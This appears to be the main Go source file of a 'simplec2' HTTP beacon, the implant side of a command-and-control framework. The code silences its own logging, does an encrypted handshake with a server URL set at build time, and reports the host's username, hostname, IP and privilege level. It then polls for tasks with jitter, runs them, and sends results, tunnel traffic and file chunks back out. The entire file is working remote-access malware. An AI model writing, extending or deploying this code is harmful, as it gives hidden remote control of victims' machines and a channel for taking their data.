package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	_ "embed"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	math_rand "math/rand" // Import math/rand as math_rand
	"net"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"time"

		"simplec2/agents/http/command"

		"simplec2/pkg/bridge" // Import bridge package

		"sync" // Import sync package

	

		"google.golang.org/protobuf/types/known/timestamppb"

	)

//go:embed listener.pub
var listenerPublicKey []byte

var (
	serverURL  string // To be set at build time via -ldflags
	beaconID   string
	sessionID  string
	sessionKey []byte

	// Global queue for outgoing tunnel messages from agent to TeamServer
	outgoingTunnelQueue chan *bridge.TunnelMessage
	// Mutex to protect access to command.activeTunnels map for dispatching incoming data
	tunnelDispatchMutex sync.Mutex
)

// --- Silent Mode Support ---
// In production C2 beacons, we should be silent (no stdout output)
// Set SilentMode = true to disable all log output
const SilentMode = true

func init() {
	if SilentMode {
		// Disable all log output by setting output to io.Discard
		log.SetOutput(io.Discard)
	}
}

// --- Main Logic ---

// main is the entry point of the beacon.
// It performs the initial handshake and staging, then enters the check-in loop.
func main() {
	math_rand.Seed(time.Now().UnixNano()) // Seed the random number generator

	if serverURL == "" {
		log.Fatal("serverURL is not set. Please set it at build time using -ldflags.")
	}

	// Initialize outgoing tunnel queue
	outgoingTunnelQueue = make(chan *bridge.TunnelMessage, 100) // Buffer for 100 messages
	// Inject outgoingTunnelQueue into command package for sendTunnelData
	command.SetOutgoingTunnelQueue(outgoingTunnelQueue)

	if err := performHandshake(); err != nil {
		log.Fatalf("Handshake failed: %v", err)
	}
	log.Println("Handshake successful, session established.")

	if err := stageBeacon(); err != nil {
		log.Fatalf("Staging failed: %v", err)
	}
	log.Printf("Staged successfully, got BeaconID: %s", beaconID)

	// 初始化文件下载器依赖注入
	command.SetChunkDownloader(&beaconChunkDownloader{})

	checkInLoop()
}

// checkInLoop is the main loop of the beacon.
// It periodically checks in with the TeamServer to get tasks and sends back the results.
func checkInLoop() {
	log.Println("Entering check-in loop...")
	for {
		// Calculate jittered sleep duration
		baseSleepSeconds := command.SleepInterval.Seconds()
		jitterRange := baseSleepSeconds * float64(command.JitterPercentage) / 100.0
		// Random value between -jitterRange and +jitterRange
		randomJitter := (math_rand.Float64()*2 - 1) * jitterRange
		actualSleepSeconds := baseSleepSeconds + randomJitter

		if actualSleepSeconds < 1 { // Ensure sleep is at least 1 second
			actualSleepSeconds = 1
		}
		
		log.Printf("Sleeping for %f seconds...", actualSleepSeconds)
		time.Sleep(time.Duration(actualSleepSeconds) * time.Second)

		log.Printf("Checking in for tasks (interval: %s, jitter: %d%%)...", command.SleepInterval, command.JitterPercentage)

		// Collect outgoing tunnel messages
		outgoingMsgs := collectOutgoingTunnelMessages()

		checkinReq := &bridge.CheckInBeaconRequest{
			BeaconId:           beaconID,
			ListenerName:       "http", // TODO: Make configurable or dynamic
			RemoteAddr:         "127.0.0.1:0", // TODO: Get actual remote address
			Timestamp:          timestamppb.Now(), // Placeholder
			OutgoingTunnelData: outgoingMsgs,
		}

		checkinReqBytes, err := json.Marshal(checkinReq) // Marshal protobuf message to JSON
		if err != nil {
			log.Printf("Failed to marshal checkin request: %v", err)
			continue
		}

		encryptedCheckin, err := encrypt(checkinReqBytes)
		if err != nil {
			log.Printf("Failed to encrypt checkin data: %v", err)
			continue
		}

		checkinRespBytes, err := doPost(serverURL+"/checkin", encryptedCheckin)
		if err != nil {
			log.Printf("Check-in failed: %v", err)
			continue
		}

		var checkinData bridge.CheckInBeaconResponse // Use protobuf type
		if err := json.Unmarshal(checkinRespBytes, &checkinData); err != nil {
			log.Printf("Failed to decode check-in response: %v", err)
			continue
		}

		// Process incoming tasks
		if len(checkinData.Tasks) > 0 {
			processTasks(checkinData.Tasks)
		} else {
			log.Println("No tasks received.")
		}

		// Process incoming tunnel messages
		if len(checkinData.IncomingTunnelData) > 0 {
			log.Printf("Received %d incoming tunnel messages.", len(checkinData.IncomingTunnelData))
			dispatchIncomingTunnelMessages(checkinData.IncomingTunnelData)
		}
	}
}

// collectOutgoingTunnelMessages non-blockingly collects messages from the outgoingTunnelQueue.
func collectOutgoingTunnelMessages() []*bridge.TunnelMessage {
	var messages []*bridge.TunnelMessage
	for {
		select {
		case msg := <-outgoingTunnelQueue:
			messages = append(messages, msg)
			if len(messages) >= 10 { // Don't send too many messages at once, max 10
				return messages
			}
		default:
			return messages
		}
	}
}

// dispatchIncomingTunnelMessages dispatches incoming tunnel messages to the appropriate tunnel handler.
func dispatchIncomingTunnelMessages(messages []*bridge.TunnelMessage) {
	tunnelDispatchMutex.Lock() // Protect activeTunnels map
	defer tunnelDispatchMutex.Unlock()

	for _, msg := range messages {
		entry, exists := command.GetActiveTunnel(msg.TunnelId) // Use getter from command package
		if !exists {
			log.Printf("Received tunnel message for non-existent tunnel ID: %s", msg.TunnelId)
			// Send an error back to TeamServer for this tunnel
			command.SendTunnelError(msg.TunnelId, "Tunnel not found on agent", false)
			continue
		}

		switch msg.CommandType {
		case bridge.TunnelMessage_DATA:
			select {
			case entry.Inbound <- msg.Data:
				// Data successfully queued
			case <-time.After(100 * time.Millisecond): // Avoid blocking indefinitely
				log.Printf("Failed to queue incoming data for tunnel %s: inbound channel full", msg.TunnelId)
				command.SendTunnelError(msg.TunnelId, "Agent inbound channel full", false)
			}
		case bridge.TunnelMessage_STOP, bridge.TunnelMessage_START: // Start commands are handled by tasks, stop signals are for cleanup
			if msg.IsFin { // If TeamServer explicitly wants to close
				command.SignalTunnelClose(msg.TunnelId) // Use helper from command package
			}
		default:
			log.Printf("Received unknown tunnel command type: %v for tunnel %s", msg.CommandType, msg.TunnelId)
			command.SendTunnelError(msg.TunnelId, fmt.Sprintf("Unknown tunnel command type: %v", msg.CommandType), false)
		}
	}
}


// processTasks iterates over the received tasks and executes them.
func processTasks(tasks []*bridge.Task) { // Use protobuf type
	for _, task := range tasks {
		var output []byte
		var err error

		// 使用命令注册表分发
		cmdTask := &command.Task{
			TaskID:    task.TaskId, // Use protobuf field name
			CommandID: task.CommandId, // Use protobuf field name
			Arguments: task.Arguments,
		}

		handler, ok := command.Get(task.CommandId) // Use protobuf field name
		if !ok {
			err = fmt.Errorf("unknown command ID: %d", task.CommandId)
		} else {
			output, err = handler.Execute(cmdTask)
		}

		if err != nil {
			log.Printf("Error executing task %s: %v", task.TaskId, err)
			output = []byte(fmt.Sprintf("Task failed: %v", err))
		}

		pushTaskOutput(task.TaskId, output) // Use protobuf field name
	}
}

// --- ChunkDownloader Implementation ---

// beaconChunkDownloader 实现 command.ChunkDownloader 接口
type beaconChunkDownloader struct{}

func (d *beaconChunkDownloader) DownloadChunk(taskID string, chunkNumber int64) ([]byte, error) {
	chunkReqMap := map[string]interface{}{
		"task_id":      taskID,
		"chunk_number": chunkNumber,
	}
	chunkReqBody, _ := json.Marshal(chunkReqMap)

	encryptedReq, err := encrypt(chunkReqBody)
	if err != nil {
		return nil, fmt.Errorf("failed to encrypt chunk request for chunk %d: %v", chunkNumber, err)
	}

	encryptedChunkData, err := doPostAndGetRaw(serverURL+"/chunk", encryptedReq)
	if err != nil {
		return nil, fmt.Errorf("failed to download chunk %d: %v", chunkNumber, err)
	}

	chunkData, err := decrypt(encryptedChunkData)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt chunk %d: %v", chunkNumber, err)
	}

	return chunkData, nil
}

func pushTaskOutput(taskID string, output []byte) {
	outputReq := &bridge.PushBeaconOutputRequest{
		BeaconId:     beaconID,
		TaskId:       taskID,
		Output:       output,
		ListenerName: "http", // TODO: Make configurable or dynamic
		RemoteAddr:   "127.0.0.1:0", // TODO: Get actual remote address
		Timestamp:    timestamppb.Now(), // Placeholder
		Status:       0, // 0 for success
		// ErrorMessage will be set if an error occurred during task execution
	}
	outputReqBody, _ := json.Marshal(outputReq)

	encryptedOutput, err := encrypt(outputReqBody)
	if err != nil {
		log.Printf("Failed to encrypt task output for %s: %v", taskID, err)
		return
	}

	_, err = doPost(serverURL+"/output", encryptedOutput)
	if err != nil {
		log.Printf("Failed to push output for task %s: %v", taskID, err)
	} else {
		log.Printf("Successfully pushed output for task %s", taskID)
	}
}

// --- HTTP & Staging ---

// stageBeacon sends the initial beacon metadata to the TeamServer to register itself.
func stageBeacon() error {
	hostname, err := os.Hostname()
	if err != nil || hostname == "" {
		hostname = os.Getenv("HOSTNAME")
		if hostname == "" {
			hostname = "unknown_host"
		}
	}
	metadata := &bridge.BeaconMetadata{ // Use protobuf type
		Pid:             int32(os.Getpid()), // Convert to int32
		Os:              runtime.GOOS,
		Arch:            runtime.GOARCH,
		Username:        getUsername(),
		Hostname:        hostname,
		InternalIp:      getInternalIP(),
		ProcessName:     os.Args[0],
		IsHighIntegrity: checkHighIntegrity(),
	}

	// Create StageBeaconRequest using protobuf type
	stageReq := &bridge.StageBeaconRequest{
		ListenerName: "http", // TODO: Make configurable or dynamic
		RemoteAddr:   "127.0.0.1:0", // TODO: Get actual remote address
		Timestamp:    timestamppb.Now(), // Placeholder
		Metadata:     metadata,
	}

	jsonData, err := json.Marshal(stageReq)
	if err != nil {
		return fmt.Errorf("failed to marshal staging request: %v", err)
	}

	encryptedData, err := encrypt(jsonData)
	if err != nil {
		return fmt.Errorf("failed to encrypt staging data: %v", err)
	}

	decryptedBody, err := doPost(serverURL+"/stage", encryptedData)
	if err != nil {
		return err
	}

	var stageResp bridge.StageBeaconResponse // Use protobuf type
	if err := json.Unmarshal(decryptedBody, &stageResp); err != nil {
		return fmt.Errorf("failed to decode staging response: %v", err)
	}

	beaconID = stageResp.AssignedBeaconId // Use protobuf field name
	return nil
}


// doPost performs a POST request to the TeamServer with the given URL and body.
// It handles the encryption and decryption of the request and response.
func doPost(url string, body []byte) ([]byte, error) {
	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(body))
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Session-ID", sessionID)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNotFound {
		log.Println("Beacon not found on TeamServer. Terminating.")
		os.Exit(0) // Exit if beacon is disowned
	}

	if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("request failed with status %s: %s", resp.Status, string(respBody))
	}

	encryptedBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response body: %v", err)
	}

	// An empty body can be a valid response (e.g. for task output)
	if len(encryptedBody) == 0 {
		return nil, nil
	}

	return decrypt(encryptedBody)
}

// --- Encryption & Handshake ---

// performHandshake performs the initial handshake with the listener to establish a session and a session key.
func performHandshake() error {
	key := make([]byte, 32) // AES-256
	if _, err := rand.Read(key); err != nil {
		return fmt.Errorf("could not generate session key: %v", err)
	}
	sessionKey = key

	block, _ := pem.Decode(listenerPublicKey)
	if block == nil {
		return fmt.Errorf("failed to decode PEM block containing public key")
	}
	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return fmt.Errorf("failed to parse public key: %v", err)
	}
	rsaPub, ok := pub.(*rsa.PublicKey)
	if !ok {
		return fmt.Errorf("public key is not an RSA key")
	}

	encryptedKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsaPub, sessionKey, nil)
	if err != nil {
		return fmt.Errorf("failed to encrypt session key: %v", err)
	}

	resp, err := http.Post(serverURL+"/handshake", "application/octet-stream", bytes.NewBuffer(encryptedKey))
	if err != nil {
		return fmt.Errorf("failed to send handshake request: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("handshake failed with status %s: %s", resp.Status, string(body))
	}

	var respBody struct {
		SessionID string `json:"session_id"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&respBody); err != nil {
		return fmt.Errorf("failed to decode handshake response: %v", err)
	}

	sessionID = respBody.SessionID
	if sessionID == "" {
		return fmt.Errorf("listener did not return a session ID")
	}

	return nil
}

func encrypt(plaintext []byte) ([]byte, error) {
	c, err := aes.NewCipher(sessionKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func decrypt(ciphertext []byte) ([]byte, error) {
	c, err := aes.NewCipher(sessionKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// --- Helper Functions ---

func getUsername() string {
	currentUser, err := user.Current()
	if err == nil {
		return currentUser.Username
	}
	// Fallback to environment variables
	if u := os.Getenv("USER"); u != "" {
		return u
	}
	if u := os.Getenv("USERNAME"); u != "" {
		return u
	}
	return "unknown"
}

func getInternalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "127.0.0.1"
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "127.0.0.1"
}

// doPostAndGetRaw is a variant of doPost that returns the raw (but still encrypted) response body,
// without trying to decrypt it. This is needed for downloading file chunks.
func doPostAndGetRaw(url string, body []byte) ([]byte, error) {
	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(body))
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Session-ID", sessionID)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("request failed with status %s: %s", resp.Status, string(respBody))
	}

	return io.ReadAll(resp.Body)
}
